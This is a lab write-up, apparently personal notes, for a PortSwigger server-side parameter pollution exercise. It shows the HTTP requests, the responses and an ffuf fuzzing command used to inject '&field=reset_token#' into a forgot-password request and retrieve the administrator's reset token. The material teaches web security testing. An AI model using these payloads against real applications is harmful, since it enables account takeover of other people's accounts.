[Lab](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)

---

I went to `/forgot-password` and captured the `POST` request
###### Request
```http
POST /forgot-password HTTP/2
Host: 0aa500d903bf512581442a8b000f0033.web-security-academy.net
Cookie: session=TOa0Zg54CCJ8kBbureDXG12xsPnm2KcU
Content-Length: 63

csrf=8j53edkx5AosFCVcECeRRgVRUZt0bXbT&username=administrator
```
###### Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

Then I added the `#` in url encoded `%23` and the end to trigger alerts
###### Request
```http
POST /forgot-password HTTP/2
Host: 0aa500d903bf512581442a8b000f0033.web-security-academy.net
Cookie: session=TOa0Zg54CCJ8kBbureDXG12xsPnm2KcU
Content-Length: 63

csrf=8j53edkx5AosFCVcECeRRgVRUZt0bXbT&username=administrator%23
```
###### Response
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"error": "Field not specified."}
```

This tells me that I should specify a `field`, so I tried the `email` field, still with the `%23` at the end (`#`)
###### Request
```http
POST /forgot-password HTTP/2
Host: 0aa500d903bf512581442a8b000f0033.web-security-academy.net
Cookie: session=TOa0Zg54CCJ8kBbureDXG12xsPnm2KcU
Content-Length: 77

csrf=8j53edkx5AosFCVcECeRRgVRUZt0bXbT&username=administrator%26field=email%23
```

Fuzzing available field with `fuff`
```shell
ffuf -X POST -d 'csrf=77Se0RgI35eMRj64roAt2yupl2rW25pX&username=administrator%26field=FUZZ%23' -b 'session=ZBrYmZ5bp0EQHRqFodLywG1GR21M46EZ' -u 'https://0a6e0041044623c6855f12b80098000f.web-security-academy.net/forgot-password' -w /  
usr/share/sqlmap/data/txt/common-tables.txt -mc 200
```

###### Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

In a js file like `forgot-password.js` (I don't remember the name, I crashed the lab), there is a field called `reset_token`, so I could change the request payload and get back the reset password token
###### Request
```http
POST /forgot-password HTTP/2
Host: 0aa500d903bf512581442a8b000f0033.web-security-academy.net
Cookie: session=TOa0Zg54CCJ8kBbureDXG12xsPnm2KcU
Content-Length: 77

csrf=8j53edkx5AosFCVcECeRRgVRUZt0bXbT&username=administrator%26field=reset_token%23
```

This gave me the token in response and I had to go on `/reset-password?reset_token=[token]` to be able to reset the `administrator` password

